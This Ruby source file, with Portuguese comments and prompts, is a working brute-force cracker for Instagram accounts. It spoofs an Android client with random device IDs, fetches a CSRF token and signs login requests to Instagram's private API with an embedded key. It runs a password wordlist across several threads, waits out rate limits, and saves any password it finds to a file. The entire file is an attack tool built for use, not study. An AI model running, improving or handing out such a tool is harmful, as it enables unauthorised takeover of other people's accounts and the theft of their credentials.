require 'openssl'
require 'net/http'
require 'uri'
require 'json'
require 'securerandom'
require 'thread'
require 'time'

# Códigos de cores ANSI
class String
  # Cores do texto
  def black;          "\e[30m#{self}\e[0m" end
  def red;            "\e[31m#{self}\e[0m" end
  def green;          "\e[32m#{self}\e[0m" end
  def yellow;         "\e[33m#{self}\e[0m" end
  def blue;           "\e[34m#{self}\e[0m" end
  def magenta;        "\e[35m#{self}\e[0m" end
  def cyan;           "\e[36m#{self}\e[0m" end
  def white;          "\e[37m#{self}\e[0m" end
  def bright_black;   "\e[90m#{self}\e[0m" end
  def bright_red;     "\e[91m#{self}\e[0m" end
  def bright_green;   "\e[92m#{self}\e[0m" end
  def bright_yellow;  "\e[93m#{self}\e[0m" end
  def bright_blue;    "\e[94m#{self}\e[0m" end
  def bright_magenta; "\e[95m#{self}\e[0m" end
  def bright_cyan;    "\e[96m#{self}\e[0m" end
  def bright_white;   "\e[97m#{self}\e[0m" end

  # Estilos do texto
  def bold;           "\e[1m#{self}\e[22m" end
  def italic;         "\e[3m#{self}\e[23m" end
  def underline;      "\e[4m#{self}\e[24m" end
  def blink;          "\e[5m#{self}\e[25m" end
  def reverse_color;  "\e[7m#{self}\e[27m" end
  
  # Background colors
  def bg_black;       "\e[40m#{self}\e[0m" end
  def bg_red;         "\e[41m#{self}\e[0m" end
  def bg_green;       "\e[42m#{self}\e[0m" end
  def bg_brown;       "\e[43m#{self}\e[0m" end
  def bg_blue;        "\e[44m#{self}\e[0m" end
  def bg_magenta;     "\e[45m#{self}\e[0m" end
  def bg_cyan;        "\e[46m#{self}\e[0m" end
  def bg_gray;        "\e[47m#{self}\e[0m" end
  
  # Cores gradientes para o banner
  def gradient_red_yellow
    result = ""
    self.chars.each_with_index do |char, i|
      case i % 6
      when 0 then result << "\e[91m#{char}\e[0m"
      when 1 then result << "\e[93m#{char}\e[0m"
      when 2 then result << "\e[33m#{char}\e[0m"
      when 3 then result << "\e[91m#{char}\e[0m"
      when 4 then result << "\e[93m#{char}\e[0m"
      when 5 then result << "\e[33m#{char}\e[0m"
      end
    end
    result
  end
end

class InstagramCracker
  def initialize
    @user = ""
    @wl_pass = "default-passwords.lst"
    @threads = 5
    @found_passwords = []
    @running = true
    @tested_passwords = 0
    @total_passwords = 0
    @mutex = Mutex.new
    
    # Headers do Instagram
    @headers = {
      'Connection' => 'close',
      'Accept' => '*/*',
      'Content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
      'Accept-Language' => 'en-US',
      'User-Agent' => 'Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)'
    }
  end
  
  def generate_random_string(length)
    # Gera string aleatória com caracteres hexadecimais
    SecureRandom.hex(length / 2)
  end
  
  def generate_device_info
    # Gera informações do dispositivo Android
    string4 = generate_random_string(4)
    string8 = generate_random_string(8)
    string12 = generate_random_string(12)
    string16 = generate_random_string(16)
    
    device = "android-#{string16}"
    uuid = generate_random_string(32)
    phone = "#{string8}-#{string4}-#{string4}-#{string4}-#{string12}"
    guid = "#{string8}-#{string4}-#{string4}-#{string4}-#{string12}"
    
    [device, uuid, phone, guid]
  end
  
  def check_account_exists(username)
    # Verifica se a conta do Instagram existe
    begin
      uri = URI.parse("https://www.instagram.com/#{username}/")
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      http.open_timeout = 10
      http.read_timeout = 10
      
      request = Net::HTTP::Get.new(uri.request_uri)
      response = http.request(request)
      
      response.code == "200"
    rescue => e
      false
    end
  end
  
  def get_csrftoken
    # Obtém token CSRF
    begin
      uri = URI.parse('https://www.instagram.com/accounts/login/')
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      
      request = Net::HTTP::Get.new(uri.request_uri)
      response = http.request(request)
      
      cookies = response['set-cookie']
      if cookies && cookies.match(/csrftoken=([^;]+)/)
        $1
      else
        "missing"
      end
    rescue => e
      "missing"
    end
  end
  
  def display_banner
    # Exibe banner do programa com cores
    system('cls') || system('clear')
    
    banner = <<~BANNER


                                                                                           
\e[95m ▄▄▄▄▄                  ▄           ▄▄▄▄▄                       █                   \e[0m       
\e[95m   █    ▄ ▄▄    ▄▄▄   ▄▄█▄▄   ▄▄▄   █    █  ▄ ▄▄   ▄▄▄    ▄▄▄   █   ▄   ▄▄▄    ▄ ▄▄ \e[0m       
\e[95m   █    █▀  █  █   ▀    █    ▀   █  █▄▄▄▄▀  █▀  ▀ █▀  █  ▀   █  █ ▄▀   █▀  █   █▀  ▀ \e[0m      
\e[95m   █    █   █   ▀▀▀▄    █    ▄▀▀▀█  █    █  █     █▀▀▀▀  ▄▀▀▀█  █▀█    █▀▀▀▀   █     \e[0m      
\e[95m ▄▄█▄▄  █   █  ▀▄▄▄▀    ▀▄▄  ▀▄▄▀█  █▄▄▄▄▀  █     ▀█▄▄▀  ▀▄▄▀█  █  ▀▄  ▀█▄▄▀   █     \e[0m      
                                                                                           
                                                                                           



    BANNER
    
    puts banner
    puts ""
  end
  
  def try_password(password, device_info, csrf_token)
    # Tenta fazer login com uma senha específica
    device, uuid, phone, guid = device_info
    
    data = {
      "phone_id" => phone,
      "_csrftoken" => csrf_token,
      "username" => @user,
      "guid" => guid,
      "device_id" => device,
      "password" => password,
      "login_attempt_count" => "0"
    }
    
    ig_sig = "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
    
    # Calcula HMAC
    data_str = data.to_json
    hmac_digest = OpenSSL::HMAC.hexdigest(
      OpenSSL::Digest.new('sha256'),
      ig_sig,
      data_str
    )
    
    payload = "ig_sig_key_version=4&signed_body=#{hmac_digest}.#{data_str}"
    
    begin
      uri = URI.parse('https://i.instagram.com/api/v1/accounts/login/')
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      http.open_timeout = 15
      http.read_timeout = 15
      
      request = Net::HTTP::Post.new(uri.request_uri, @headers)
      request.body = payload
      
      response = http.request(request)
      
      case response.code.to_i
      when 200
        if response.body.include?('logged_in_user')
          "success"
        elsif response.body.include?('challenge')
          "challenge"
        else
          "failed"
        end
      when 400
        if response.body.include?('checkpoint')
          "challenge"
        else
          "failed"
        end
      when 429
        "wait"
      else
        "failed"
      end
      
    rescue => e
      "error"
    end
  end
  
  def worker(passwords_chunk, device_info, csrf_token, worker_id)
    # Worker thread para testar senhas
    passwords_chunk.each do |password|
      break unless @running
      
      @mutex.synchronize do
        @tested_passwords += 1
        current_count = @tested_passwords
      end
      
      puts "[#{'THREAD'.bright_blue} #{worker_id.to_s.bright_cyan}] Testando (#{@tested_passwords.to_s.yellow}/#{@total_passwords.to_s.yellow}): #{password.white}"
      
      result = try_password(password.strip, device_info, csrf_token)
      
      if ["success", "challenge"].include?(result)
        puts "\n" + "=".bright_green * 60
        puts "[#{'+'.bright_green}] #{'SENHA ENCONTRADA!'.bold.bright_green.bg_black}: #{password.bold.bright_yellow}"
        if result == "challenge"
          puts "[#{'!'.bright_yellow}] #{'Challenge required - Verificação adicional necessária'.bright_yellow}"
        end
        puts "=".bright_green * 60
        
        @found_passwords << [@user, password]
        save_found_passwords
        @running = false
        return
        
      elsif result == "wait"
        puts "[#{'THREAD'.bright_blue} #{worker_id.to_s.bright_cyan}] #{'Rate limit detectado, aguardando...'.bright_yellow}"
        sleep 10
      end
    end
  end
  
  def save_found_passwords
    # Salva senhas encontradas em arquivo
    filename = 'senhas_encontradas.txt'
    File.open(filename, 'a:UTF-8') do |f|
      @found_passwords.each do |username, password|
        f.puts "Usuario: #{username} | Senha: #{password}"
        f.puts "Data: #{Time.now.strftime('%Y-%m-%d %H:%M:%S')}"
        f.puts "-" * 50
      end
    end
    puts "[#{'+'.bright_green}] #{'Senha salva em:'.white} #{filename.bright_cyan}"
  end
  
  def load_wordlist(filename)
    # Carrega wordlist do arquivo
    begin
      passwords = File.readlines(filename, encoding: 'utf-8', chomp: true)
                      .map(&:strip)
                      .reject(&:empty?)
      
      if passwords.empty?
        puts "[#{'ERRO'.bright_red}] #{'Arquivo'.white} '#{filename.yellow}' #{'está vazio!'.white}"
        return []
      end
      
      puts "[#{'+'.bright_green}] #{'Carregadas'.white} #{passwords.size.to_s.bright_green} #{'senhas de'.white} '#{filename.bright_cyan}'"
      passwords
      
    rescue Errno::ENOENT
      puts "[#{'ERRO'.bright_red}] #{'Arquivo'.white} '#{filename.yellow}' #{'não encontrado!'.white}"
      puts "\n[#{'+'.bright_green}] #{'Verifique se o arquivo'.white} 'default-passwords.lst' #{'existe no mesmo diretório'.white}"
      puts "[#{'+'.bright_green}] #{'O arquivo deve conter uma senha por linha'.white}"
      return []
    rescue => e
      puts "[#{'ERRO'.bright_red}] #{'Erro ao ler arquivo:'.white} #{e.message.red}"
      return []
    end
  end
  
  def create_sample_wordlist
    # Cria uma wordlist de exemplo se não existir
    sample_passwords = [
      "123456", "password", "12345678", "qwerty", "123456789",
      "12345", "1234", "111111", "1234567", "dragon",
      "123123", "baseball", "abc123", "football", "monkey",
      "letmein", "696969", "shadow", "master", "666666",
      "1234567890", "!@#$%^&*", "password1", "123456a", "senha",
      "admin", "teste", "123", "000000", "123456789"
    ]
    
    File.open('default-passwords.lst', 'w:UTF-8') do |f|
      sample_passwords.each { |pwd| f.puts pwd }
    end
    puts "[#{'+'.bright_green}] #{'Wordlist de exemplo criada:'.white} 'default-passwords.lst'.bright_cyan"
    puts "[#{'+'.bright_green}] #{'Adicione mais senhas a este arquivo para melhorar os resultados'.white}"
  end
  
  def print_colored_line
    # Imprime uma linha colorida
    colors = [:bright_red, :bright_yellow, :bright_green, :bright_cyan, :bright_blue, :bright_magenta]
    line = "═" * 60
    colored_line = ""
    line.chars.each_with_index do |char, i|
      color = colors[i % colors.size]
      colored_line << char.send(color)
    end
    puts colored_line
  end
  
  def get_user_input
    # Obtém entrada do usuário
    puts "\n"
    print_colored_line
    puts "#{ 'CONFIGURAÇÃO DO ATAQUE'.bold.bright_cyan}"
    print_colored_line
    puts ""
    
    print "[#{'-'.bright_yellow}] #{'Digite o username do Instagram:'.white} "
    @user = gets.chomp.strip
    
    if @user.empty?
      puts "[#{'-'.bright_red}] #{'Username não pode estar vazio!'.white}"
      return false
    end
    
    # Verificar se o arquivo de senhas existe
    unless File.exist?(@wl_pass)
      puts "[#{'-'.bright_red}] #{'Arquivo'.white} '#{@wl_pass.yellow}' #{'não encontrado!'.white}"
      print "[#{'-'.bright_yellow}] #{'Criar arquivo de exemplo?'.white} (s/n): "
      create_new = gets.chomp.downcase
      if create_new == 's'
        create_sample_wordlist
      end
      return false
    end
    
    unless check_account_exists(@user)
      puts "[#{'-'.bright_red}] #{'Usuário do Instagram não encontrado!'.white}"
      print "[#{'-'.bright_yellow}] #{'Continuar mesmo assim?'.white} (s/n): "
      retry_input = gets.chomp.downcase
      if retry_input != 's'
        return false
      end
    end
    
    print "[#{'-'.bright_yellow}] #{'Threads a usar'.white} (1-10, #{'padrão:'.white} #{@threads.to_s.bright_cyan}): "
    threads_input = gets.chomp.strip
    unless threads_input.empty?
      begin
        @threads = [1, [threads_input.to_i, 10].min].max
      rescue
        puts "[#{'-'.bright_red}] #{'Número inválido, usando padrão'.white}"
      end
    end
    
    true
  end
  
  def start_attack
    # Inicia o ataque de força bruta
    display_banner
    
    unless get_user_input
      puts "\n[#{'-'.bright_red}] #{'Configuração cancelada'.white}"
      return
    end
    
    # Carregar wordlist
    passwords = load_wordlist(@wl_pass)
    return if passwords.empty?
    
    @total_passwords = passwords.size
    
    puts "\n"
    print_colored_line
    puts "🚀 #{'INICIANDO ATAQUE...'.bold.bright_green}"
    print_colored_line
    puts ""
    puts "[#{'-'.bright_green}] #{'Usuário:'.white} #{@user.bright_cyan}"
    puts "[#{'-'.bright_green}] #{'Wordlist:'.white} #{@wl_pass.bright_cyan}"
    puts "[#{'-'.bright_green}] #{'Total de senhas:'.white} #{@total_passwords.to_s.bright_yellow}"
    puts "[#{'-'.bright_green}] #{'Threads:'.white} #{@threads.to_s.bright_yellow}"
    puts "[#{'-'.bright_red}] #{'Pressione Ctrl+C para parar'.white}"
    puts ""
    
    # Gerar informações do dispositivo e token
    device_info = generate_device_info
    csrf_token = get_csrftoken
    
    puts "[#{'*'.bright_blue}] #{'Iniciando teste de senhas...'.white}"
    
    # Dividir wordlist em chunks para threads
    chunk_size = [1, passwords.size / @threads].max
    chunks = passwords.each_slice(chunk_size).to_a
    
    # Iniciar threads
    threads = []
    chunks.each_with_index do |chunk, i|
      next if chunk.empty?
      
      thread = Thread.new do
        worker(chunk, device_info, csrf_token, i + 1)
      end
      threads << thread
    end
    
    # Aguardar threads terminarem
    begin
      threads.each(&:join)
    rescue Interrupt
      puts "\n[#{'!'.bright_red}] #{'Interrompido pelo usuário'.white}"
      @running = false
    end
    
    if @found_passwords.empty?
      puts "\n[#{'-'.bright_red}] #{'Nenhuma senha encontrada para'.white} #{@user.bright_cyan}"
      puts "[#{'-'.bright_red}] #{'Testadas'.white} #{@tested_passwords.to_s.yellow} #{'de'.white} #{@total_passwords.to_s.yellow} #{'senhas'.white}"
    else
      puts "\n[#{'+'.bright_green}] #{'Ataque concluído! Senha(s) encontrada(s) e salva(s) no arquivo.'.bold.white}"
    end
  end
  
  def resume_session
    # Continua sessão salva - Versão simplificada
    puts "[#{'!'.bright_yellow}] #{'Funcionalidade de resume não implementada nesta versão'.white}"
    puts "[#{'+'.bright_green}] #{'Iniciando novo ataque...'.white}"
    start_attack
  end
end

def main
  # Função principal
  if ARGV.include?('--resume')
    puts "[#{'!'.bright_yellow}] #{'Use o comando sem argumentos para novo ataque'.white}"
  end
  
  cracker = InstagramCracker.new
  cracker.start_attack
  
  puts "\n[#{'+'.bright_green}] #{'Programa finalizado'.white}"
  print "[#{'+'.bright_green}] #{'Pressione Enter para sair...'.white}"
  gets
end

# Executa o programa se for o arquivo principal
if __FILE__ == $0
  main
end
